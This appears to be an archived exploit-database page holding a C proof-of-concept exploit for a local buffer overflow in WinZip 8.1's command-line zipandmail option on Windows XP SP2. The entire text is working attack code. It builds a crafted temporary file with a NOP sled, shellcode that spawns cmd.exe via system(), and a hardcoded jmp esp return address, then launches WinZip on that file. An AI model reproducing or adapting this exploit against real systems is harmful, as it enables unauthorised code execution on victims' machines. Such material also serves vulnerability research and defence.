<html><head><title>WinZIP <= 8.1 Command Line Local Buffer Overflow Exploit</title></head><pre>/*
*
* WinZip Command Line Local Buffer Overflow
* http://securitytracker.com/alerts/2004/Sep/1011132.html
* http://www.winzip.com/wz90sr1.htm
* Exploit coded By ATmaCA
* Web: atmacasoft.com &amp;&amp; spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan
*
*/

/*
*
* Tested with WinZip 8.1 on Win XP Sp2 En
* Bug Fixed on WinZip 9.0 Service Release 1 (SR-1)
* http://www.winzip.com/wz90sr1.htm
*
*/

#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

#define NOP 0x90

void main()
{
        // create crafted command line
        char tmpfile[] = &quot;c:\\wzs45.tmp&quot;;
        char winzippath[] = &quot;C:\\Program Files\\WINZIP\\winzip32.exe&quot;;
        char zipandmailpar[] = &quot; -* /zipandmail /@  &quot;;
        char runpar[300];
        int i = 0;
        strcpy(runpar,winzippath);
        strcat(runpar,zipandmailpar);
        strcat(runpar,tmpfile);

        // need for some input file name .tmp but not must to exist
        char inputfile[] = &quot;C:\\someinputfile.ext\n&quot;;

        // launch a local cmd.exe
        char shellcode[] =
        &quot;\x55\x8B\xEC\x33\xFF&quot;
        &quot;\x57\x83\xEC\x04\xC6\x45\xF8&quot;
        &quot;\x63\xC6\x45\xF9\x6D\xC6\x45&quot;
        &quot;\xFA\x64\xC6\x45\xFB\x2E\xC6&quot;
        &quot;\x45\xFC\x65\xC6\x45\xFD\x78&quot;
        &quot;\xC6\x45\xFE\x65\xB8&quot;
        &quot;\xC7\x93\xC2\x77&quot; //77C293C7 system() - WinXP SP2 - msvcrt.dll
        &quot;\x50\x8D\x45\xF8\x50&quot;
        &quot;\xFF\x55\xF4&quot;;

        // create crafted .tmp file
        FILE *di;
        if( (di=fopen(tmpfile,&quot;wb&quot;)) == NULL ){
                return;
        }

        for(i=0;i&lt;sizeof(inputfile)-1;i++)
                fputc(inputfile[i],di);

        fprintf(di,&quot;c:\\&quot;);

        for(i=0;i&lt;384;i++)
                fputc(NOP,di);


        for(i=0;i&lt;sizeof(shellcode)-1;i++)
                fputc(shellcode[i],di);

        fprintf(di,&quot;\xBF\xAC\xDA\x77&quot;);  //EIP - WinXp Sp2 Eng - jmp esp addr
        fprintf(di,&quot;\x90\x90\x90\x90&quot;);  //NOPs
        fprintf(di,&quot;\x90\x83\xEC\x74&quot;);  //sub esp,0x74
        fprintf(di,&quot;\xFF\xE4\x90\x90&quot;);  //jmp esp

        fprintf(di,&quot;\n&quot;);

        fclose(di);
        WinExec(runpar,SW_SHOW);
}

// milw0rm.com [2005-06-07]</pre></html>